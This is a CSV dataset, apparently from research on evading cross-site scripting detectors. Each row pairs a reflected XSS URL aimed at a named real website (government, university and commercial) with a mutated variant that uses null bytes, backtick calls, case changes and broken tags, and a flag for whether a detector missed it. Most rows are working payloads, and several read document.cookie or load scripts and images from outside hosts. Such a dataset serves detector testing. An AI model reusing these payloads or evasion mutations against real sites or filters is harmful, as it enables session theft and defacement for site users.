Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://404.iinet.com/?file=www.iinet.com/~solarwashington/action/wabills/billssigned.htm}%3c/style%3<br>e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e&amp;status=404&amp;notes=file%20does%20not%20ex<br>ist&amp;ref=,"[['http://u', '</style>', '<script>', 'a=', 'b=', 'a(', 'b(', '/xss/.source)', ')', '</script>', 'None', 'None', 'ref=']]",http://404.iinet.com/?file=www.iinet.com/~solarwashington/action/wabills/billssigned.htm}%3c/style%3<br%00>e%3cscript%3c/style%3<br>e%3cscript%00%00%3e%3c/style%3<br>e%3cscript%3c%00/style%3<br%00>e%3cscript%00%3e%3c/style%3<br%00>e%3c%00script%3c/style%3<br%00>e%3cscript%3e%3c/style%3<br>e%3cscript%3c%00/style%3<br%00>e%3cscript%00%3ea=eval;b=alert;a`b`/xss/.source``;%3c%00/script%3c%00/script%00%3e%3c/script%3c%00%00/script%00%3e%3c/script%3c%00%00/script%00%3e%3c%00/script%3c%00/script%00%3e&amp;status=404&amp;notes=file%20does%20not%20ex<br%00%00%00><br%00%00%00><br%00%00%00><br%00%00%00><br%00%00%00><br%00%00%00><br%00%00%00><br%00%00%00>ist&amp;ref=,"[['http://u', 'None', 'None', 'None', '</style>', 'None', 'None', 'None', 'None', '<script>', '</style>', 'None', 'None', 'a=', 'b=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'ref=']]",False
http://int.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat%20harutyunyan;&amp;o=%22%<br>3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;l=dir,"[['http://u', 'http://www', 'None', 'o=', '<script>', 'alert(', '""xssed""', ')', '</script>', 'l=']]",http://int.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat%20harutyunyan;&amp;o=%22%<br>3cscript%3etop[8680439.toString(30)](1)%28%22xssed%22%29%3c/script%3e&amp;l=dir,"[['http://u', 'http://www', 'None', 'o=', '<script>', 'None', 'None', ')', '</script>', 'l=']]",False
http://sbj.saic.gov.cn/english/show.asp?id=57&amp;bm=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/script&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', '/www.r0t.n0t.nl/', ')', '</script>']]",http://sbj.saic.gov.cn/english/show.asp?id=57&amp;bm=&quot;&lt;script%00&gt;alert`/www.r3t.n3t.nl/`&lt;/script%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.horwich.gov.uk/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",http://www.horwich.gov.uk/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",True
http://perlqt.sourceforge.net/index.php?page=%27%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%<br>6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%5c%27%3b%61%6c%65%72%74%28%53%74%7<br>2%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%22%3b%61%6c<br>%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%<br>29%2f%2f%5c%22%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%3<br>8%2c%38%33%2c%38%33%29%29%2f%2f%2d%2d%3e%3c%2f%53%43%52%49%50%54%3e%22%3e%27%3e%3c%53%43%52%49%50%54<br>%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%<br>38%33%29%29%3c%2f%53%43%52%49%50%54%3e,"[['http://u', 'alert(', 'None', 'None', ')', 'None']]",http://perlqt.sourceforge.net/index.php?page=%27%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%<br 6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%5c%27%3b%61%6c%65%72%74%28%53%74%7<br 2%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%22%3b%61%6c<br %65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%<br 29%2f%2f%5c%22%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%3<br 8%2c%38%33%2c%38%33%29%29%2f%2f%2d%2d%3c%2f%53%43%52%49%50%54%3e%22%3e%27%3c%53%43%52%49%50%54<br %3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%<br 38%33%29%29%3c%2f%53%43%52%49%50%54%3e,"[['http://u', 'alert(', 'None', '>', 'None', 'alert(', 'None', 'None']]",False
http://www.laut.de/lautshop/preisvergleich/lautshop_preisvergleich_detail.php?keywords==&quot;&gt;&lt;script&gt;al<br>ert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.laut.de/lautshop/preisvergleich/lautshop_preisvergleich_detail.php?keywords==&quot;&lt;%00script&gt;al<br ert(document.cookie)&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
https://my.studentjobs.gov/login.asp?redirect=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%<br>3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",https://my.studentjobs.gov/login.asp?redirect=%22%3c%00script%3e%3c%00script%3ealert`document.cookie`%3c%00/script%3e%3c/script%00%3e%<br%00><br%00>3e%3c%00marquee%3ch1%3e%3cmarquee%3c%00h1%3eby+narcoticxs%3c/h1%3c%00/marquee%3e%3c/h1%3c%00/marquee%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
"http://journalism.berkeley.edu/students/resume.php?id=%22%3e%22%3e%3cscript%3ealert(string.fromcharc<br>ode(31,32))%3c/script%3e","[['http://u', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', 'None', ')', '</script>']]","http://journalism.berkeley.edu/students/resume.php?id=%22%3e%22%3c%00script%00%00%3ealert`string.fromcharc<br%00%00 ode`31,32``%3c%00/script%00%00%3e","[['http://u', '>', 'None', 'None']]",False
http://www.oorhs.pitt.edu/searchfunding/search.aspx?fundingtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.oorhs.pitt.edu/searchfunding/search.aspx?fundingtype=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://learn.doubleclick.com/login.asp?sessionid=%22%3e%3cscript%3ealert(/trlink.net/)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://learn.doubleclick.com/login.asp?sessionid=%22%3c%00script%3ealert`/trlink.net/`%3c%00/script%3e,"[['http://u', 'None', 'None']]",True
http://authorities.loc.gov/cgi-bin/pwebrecon.cgi?search_arg=%22%3e%3cscript%3ealert%281%29%3c%2fscri<br>pt%3e&amp;search_code=shed_&amp;pid=22974&amp;seq=20070509222114&amp;cnt=25&amp;hist=1,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'None', 'pid=', 'None', 'None', 'None']]",make-a-glass-bowl-with-a-napkin-in-blender&t=1396630386241&n=5454963&k=mainentityhttp://authorities.loc.gov/cgi-bin/pwebrecon.cgi?search_arg=%22%3e<script /drfv/alert%281%29%3c%2fscri<script pt%3e&amp;search_code=shed_&amp;pid=22974&amp;seq=20070509222114&amp;cnt=25&amp;hist=1,"[['http://u', 'n=', 'k=', 'None', 'None', '>', 'None', 'None', 'pid=', 'None', 'None', 'None']]",False
http://www.xangrila.rs.gov.br/busca.php?&amp;acao=busca&amp;dsbusca=%22%3e'%3e%3cscript%20src=http://vuln.xs<br>sed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,"[['http://u', 'None', '>', '>', '<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>', '</script>']]",http://www.xangrila.rs.gov.br/busca.php?&amp;acao=busca&amp;dsbusca=%22%3c%00script%20src=http://vuln.xs<br%00>sed.net/thirdparty/scripts/python5.js%3c%00/script%00%3e,"[['http://u', 'None', 'None', 'None']]",True
http://www.bogota.gov.co/phpinfo.php?a[]=&gt;&lt;script&gt;alert(/kabus-kabustr.com/);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.bogota.gov.co/phpinfo.php?a[]=&lt;script&lt;script&gt;alert`/kabus-kabustr.com/`;&lt;/script&lt;/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.justiz.gv.at/en/?glng=en%27%22%3e%3cimg%20src=foo.png%20onerror=alert(/xss/)%20/%3e%3cmar<br>quee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', '>', 'None', '<marquee bgcolor=""red"">', '<h0>', '</h0>', '</marquee>']]",http://www.justiz.gv.at/en/?glng=en%27%22%3cimg%20src=foo.png%20onerror=alert(/xss/)%20/%3cmar<br>quee%20bgcolor=%22red%22%3ch1%3exss%20by%20xylitol%3c/h1%3c/marquee%3e,"[['http://u', 'None', 'None']]",True
http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,"[['http://u', '<script>', 'alert(', ')', '</script>']]",http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript%00&gt;alert`'pappy%20was%20here'`;&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.aeg.electrolux.com.tr/node128.asp?query=%22%3e%3cscript%3ealert(%27drakula%27)%3c/script%<br>3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.aeg.electrolux.com.tr/node128.asp?query=%22%3cscript%3cscript%00%3ealert`%27drakula%27`%3c/script%<br%00><br%00>3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.fling.com/main.php?gender=&amp;country_code=fr&amp;location_id=&amp;is_active=0&amp;position=0&amp;bmon=&amp;bday<br>=&amp;byear=--&amp;email=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscript%3e&amp;username=&amp;passwor<br>d=&amp;process=validate&amp;a=user.register_iframe&amp;advert=enoramedia&amp;prg=1&amp;id=enoramedia&amp;tour=search&amp;cmp=xvi<br>d_928_1103_foot2&amp;ad_id=&amp;jf=&amp;act=register&amp;io_bb=0400gggkvt2dadm%2fyovibnjaiulaq1gpxgzlxavi0%2bfsdukak<br>zttorgnxz3ciai%2bm26%2bhqchlco4fslz17engle7xxqlwrnjn5m7jxhnifkxyhfqbz9hsabtxfbpae97i9s835cciofilx0ed<br>y3kusarrign0c4lgbdglmd7i2jbchnwpppv0zsmv8%2fpvayuo0neau1bzknc3nz9nrvffcdivoh9b7nkzd0ikc1qok6fc4ev5go<br>w%2bggehsqpcd6ksm4zr2cgxyt3j07d6wf1rrmlegrbx1csx7ku4cfkx6r7pix%2fczwvdpetn9eyklwivh4flvmshr9mfc1xocu<br>htjivrr%2fxjr7mr0wvcjvmjkbp4svfl0zmzd89caae4cnuffskwkr0mf%2bogwyqnlduaqcv8aea3iga4xxla9yimzswhz36yc%<br>2f35jahdfxg8dz%2f%2b4rjtgf6yeu%2bpkuq1v99pkbony1znntcmg8xjbn5bbnvllrnykrsb%2fczmgvlegjlsdpvuwllnte9q<br>pxdmbcprcsymf6hi7s1fwsm%2bmdvmy%2bh9ul1t13mzgt5n3e7nvrnswkyzsgzjdagffoe185ecboa%2brfpbqgc%2f4yijmpxd<br>wdxjzqnzqtbxtgjnwtb4skz3v7ahz5pwpttl3ejzmvgme3auwn2ukioajcihxk5cjotasm4gac32%2fbwe8mpsvk6dtjaa24wper<br>zpoianloa2fqfhxa%2bk9xrliy%2fun1h6iltepjfmwyi1wer%2fbu5%2fduwsacq6c1nptkhjzjn2vzc1yo77chilblq6eshdan<br>5moivmsn%2f%2bl1k8eixka%3d%3d&amp;bgcolor=transparent&amp;font_color=000000&amp;font_family=verdana&amp;button_text=<br>see+me+naked,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'email=', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', 'username=', 'password=', 'None', 'a=', 'None', 'None', 'id=', 'None', 'None', 'None', 'None', 'act=', 'None', 'None', 'None', 'None', 'None', 'None']]",http://www.fling.com/main.php?gender=&amp;country_code=fr&amp;location_id=&amp;is_active=0&amp;position=0&amp;bmon=&amp;bday<br%00 <br%00 =&amp;byear=--&amp;email=%27%22%3c%2ftitle%00%3c%2ftitle%00%3c%00script%3c%00script%3ealert%281337%29%3c%00%2fscript%3c%00%2fscript%3e&amp;username=&amp;passwor<br%00 <br%00 d=&amp;process=validate&amp;a=user.register_iframe&amp;advert=enoramedia&amp;prg=1&amp;id=enoramedia&amp;tour=search&amp;cmp=xvi<br%00 <br%00 d_928_1103_foot2&amp;ad_id=&amp;jf=&amp;act=register&amp;io_bb=0400gggkvt2dadm%2fyovibnjaiulaq1gpxgzlxavi0%2bfsdukak<br%00 <br%00 zttorgnxz3ciai%2bm26%2bhqchlco4fslz17engle7xxqlwrnjn5m7jxhnifkxyhfqbz9hsabtxfbpae97i9s835cciofilx0ed<br%00 <br%00 y3kusarrign0c4lgbdglmd7i2jbchnwpppv0zsmv8%2fpvayuo0neau1bzknc3nz9nrvffcdivoh9b7nkzd0ikc1qok6fc4ev5go<br%00 <br%00 w%2bggehsqpcd6ksm4zr2cgxyt3j07d6wf1rrmlegrbx1csx7ku4cfkx6r7pix%2fczwvdpetn9eyklwivh4flvmshr9mfc1xocu<br%00 <br%00 htjivrr%2fxjr7mr0wvcjvmjkbp4svfl0zmzd89caae4cnuffskwkr0mf%2bogwyqnlduaqcv8aea3iga4xxla9yimzswhz36yc%<br%00 <br%00 2f35jahdfxg8dz%2f%2b4rjtgf6yeu%2bpkuq1v99pkbony1znntcmg8xjbn5bbnvllrnykrsb%2fczmgvlegjlsdpvuwllnte9q<br%00 <br%00 pxdmbcprcsymf6hi7s1fwsm%2bmdvmy%2bh9ul1t13mzgt5n3e7nvrnswkyzsgzjdagffoe185ecboa%2brfpbqgc%2f4yijmpxd<br%00 <br%00 wdxjzqnzqtbxtgjnwtb4skz3v7ahz5pwpttl3ejzmvgme3auwn2ukioajcihxk5cjotasm4gac32%2fbwe8mpsvk6dtjaa24wper<br%00 <br%00 zpoianloa2fqfhxa%2bk9xrliy%2fun1h6iltepjfmwyi1wer%2fbu5%2fduwsacq6c1nptkhjzjn2vzc1yo77chilblq6eshdan<br%00 <br%00 5moivmsn%2f%2bl1k8eixka%3d%3d&amp;bgcolor=transparent&amp;font_color=000000&amp;font_family=verdana&amp;button_text=<br%00 <br%00 see+me+naked,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'alert(', '0', ')', 'None', 'username=', 'None', 'None', 'd=', 'None', 'a=', 'None', 'None', 'id=', 'None', 'None', 'None', 'None', 'None', 'None', 'act=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",False
http://ituned.in/search.php?q=%22%3e%3cscript%3ealert(%22w0ot%22)%3c/script%3e&amp;sc=all,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', 'None']]",http://ituned.in/search.php?q=%22%3c%00script%3ealert`%22w0ot%22`%3c/script%00%3e&amp;sc=all,"[['http://u', 'None', 'None', 'None']]",True
http://www.gwahs.nsw.gov.au/index.php?select=media&amp;option2=%22%3e%3cscript%3ealert(/xss/)%3c/script%<br>3e,"[['http://u', 'None', '>', '<script>', 'alert(', '/xss/', ')', '</script>']]",//www.gwahs.nsw.gov.au/index.php?select=media&amp;option2=%22%3cscript%00%3ealert`/xss/`%3c/script%<br%00>3e,"[['http://u', 'None', 'None', 'None']]",True
http://www.goisrael.com/tourism_eng/search.htm?searchwords=%3cscript%3ealert(%22xss found by edgard<br>chammas aka 454447415244!%22)%3c%2fscript%3e,"[['http://u', '<script>', 'alert(', ')', '</script>']]",//www.goisrael.com/tourism_eng/search.htm?searchwords=%3cscript%00%3ealert(%22xss found by edgard<br chammas aka 454447415244!%22)%3c%2fscript%00%3e,"[['http://u', 'None', 'alert(', 'None']]",True
http://members.freewebs.com/page.jsp?page=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;,"[['http://u', '>', '</script>', '<script>', 'alert(', '0', ')', '</script>']]",http://members.freewebs.com/page.jsp?page=&quot;&lt;/script&lt;%00script&gt;alert`123`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.ilga.gov/legislation/publicacts/fulltext.asp?name=094-0741%3cbody%20onload=%22document.bo<br>dy.innerhtml='%3cimg%20src=http://palovera.org/sus3.jpg%3e%3c/img%3e';%22%3e,"[['http://u', 'None', '</img>', '>']]",http://www.ilga.gov/legislation/publicacts/fulltext.asp?name=094-0741%3cbody%20onload=%22document.bo<br%00>dy.innerhtml=%3cimg%20src=http://palovera.org/sus3.jpg%3c%00/img%3e;%22%3e,"[['http://u', 'None', 'innerhtml=', 'None', '>']]",False
http://www.aa.org/results.cfm?results=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.aa.org/results.cfm?results=%27%22%3c%2ftitle%00%3c%00%2ftitle%3cscript%00%3c%00script%3ealert`1337`%3c%00%2fscript%3c%2fscript%00%3e%<br <br 3e%3c%00marquee%3cmarquee%00%3ch1%00%3ch1%00%3exss+by+xylitol%3c%2fh1%00%3c%00%2fh1%3c%00%2fmarquee%3c%2fmarquee%00%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.hurtigruten.us/about/search/?quicksearchquery=%3cscript%3ealert%28%27xss%27%29%3c/script%<br>3e&amp;result=%3cscript%3ealert%28%27xss%27%29%3c/script%3e,"[['http://u', '<script>', 'alert(', ""'xss'"", ')', '</script>', 'None', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",//www.hurtigruten.us/about/search/?quicksearchquery=%3c%00script%00%3e%3c%00script%00%3ealert%28%27xss%27%29%3c%00/script%<br 3e&amp;result=%3cscript%00%3e%3c%00/script%<br 3e&amp;result=%3cscript%00%3ealert%28%27xss%27%29%3c%00/script%00%3e%3c%00/script%00%3e,"[['http://u', 'None', 'None', 'alert(', ""'xss'"", ')', 'None', 'None', 'alert(', ""'xss'"", ')', 'None', 'None']]",False
http://www.klenky.ch/gu3stbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.klenky.ch/gu3stbook/index.php?lang=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;&lt;marquee&lt;h1<br%00 &gt;backdoor&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://science.gsfc.nasa.gov/sed/index.cfm?srchfield=%27%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&x=37&y=4&fuseaction=search.quick,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'x=', 'y=', 'None']]",http://science.gsfc.nasa.gov/sed/index.cfm?srchfield=%27%22<sC%00rIPt /drfv/alert%28document.cookie%29%3b%3c%2FsCripT%00%3E&x=37&y=4&fuseaction=search.quick,"[['http://u', 'None', 'x=', 'y=', 'None']]",True
http://www.thenudeboard.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.thenudeboard.com/phpinfo.php?a[]=%22%3c%00script%3ealert`document.cookie`%3c%00/script%3e,"[['http://u', 'None', 'None']]",True
http://www.poste.dz/ap/?page=%22%3e%3cscript%3ealert%28/mahboul-3lik/.source%29%3c/script%3e&lt;marquee<br>&gt;&lt;h1&gt;xss%20by%20samir-dz&lt;iframe%20%20src=index.php&gt;#,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', '<marquee>', '<h0>', 'None']]",http://www.poste.dz/ap/?page=%22%3cScRIPT%00%3ealert%28/mahboul-3lik/.source%29%3C/scRIpt%00%3e&lT;%00mARQUeE<Br>&lt;%00h1&Gt;xss%20by%20samir-dz&Lt;ifrAmE%20%20sRC=indeX.php%00&gT;#,"[['http://u', 'None', 'alert(', 'None', ')', 'None', 'None', 'None']]",False
http://search.dowjones.com/query.html?qt=search&amp;oldqt=&lt;script&gt;alert(&quot;xss - zj&quot;)&lt;/script&gt;,"[['http://u', 'None', '<script>', 'alert(', ')', '</script>']]",http://search.dowjones.com/query.html?qt=search&amp;oldqt=&lt;script%00&gt;alert`&quot;xss - zj&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.kontraband.com/search/?search=%22%3e%3cscript%3ealert(%27xssed%27)%3c%2fscript%3e%3c%2fhe<br>ad%3e%3c!--,"[['http://u', '>', '<script>', 'alert(', ""'xssed'"", ')', '</script>', 'None', '<!--']]",http://www.kontraband.com/search/?search=%22%3c%00script%00%00%00%00%00%3e%3c%00script%00%00%00%00%00%3ealert`%27xssed%27`%3c%2fscript%00%3c%2fhe<br%00%00%00%00%00><br%00%00%00%00%00>ad%00%3c!--,"[['http://u', 'None', 'None', ""'xssed'"", 'None', 'None', '<!--']]",False
http://www.videogame.it/shop/default.asp?act=search&amp;search=&quot;&gt;&lt;img<br>src=&quot;http://img96.imageshack.us/img96/8009/xssks5.jpg&quot;&gt;,"[['http://u', 'search=', '>', 'None']]",http://www.videogame.it/shop/default.asp?act=search&amp;search=&quot;&lt;img<br>src=&quot;http://img96.imageshack.us/img96/8009/xssks5.jpg&quot;&gt;,"[['http://u', 'search=', 'None']]",True
http://blog.trendmicro.com/?s=%22%3e%3cscript%3ealert%28%2fpr0xy3r+was+here!%2f%29%3c%2fscript%3e,"[['http://u', '>', '<script>', 'alert(', ')', '</script>']]",http://blog.trendmicro.com/?s=%22%3e<script>/drfv/alert%28%2fpr0xy3r+was+here!%2f%29%3c%2fscript%3e,"[['http://u', '>', '<script>', 'alert(', ')', '</script>']]",False
http://news.naver.com/news/read.php?mode=lss2d&amp;office_id=018&amp;article_id=0000521219&amp;section_id=102&amp;se<br>ction_id2=257&amp;menu_id=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://news.naver.com/news/read.php?mode=lss2d&amp;office_id=018&amp;article_id=0000521219&amp;section_id=102&amp;se<br ction_id2=257&amp;menu_id=&quot;&lt;script&gt;alert`1`&lt;/script&gt;,"[['http://u', 'None', 'None', 'None', 'None', '</script>']]",False
http://users.gametrailers.com/sendmov.php?id=112125&amp;um=1&amp;e=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32<br>%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%<br>34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,"[['http://u', 'None', 'None', '>', '>', '<script>', 'alert(', 'None', '0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)', ')', '</script>']]",http://users.gametrailers.com/sendmov.php?id=112125&amp;um=1&amp;e=%22%3e%27%3C%00%00%73%63%72%69%70%74%3E%61%6<BR%00%00>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32<bR%00%00 %2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%<Br%00%00>34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3C%00%2f%73%63%72%69%70%74%00%3E%0a,"[['http://u', 'None', 'None', '>', 'None', 'None', 'None', 'None', 'None', ')', ')', 'None']]",False
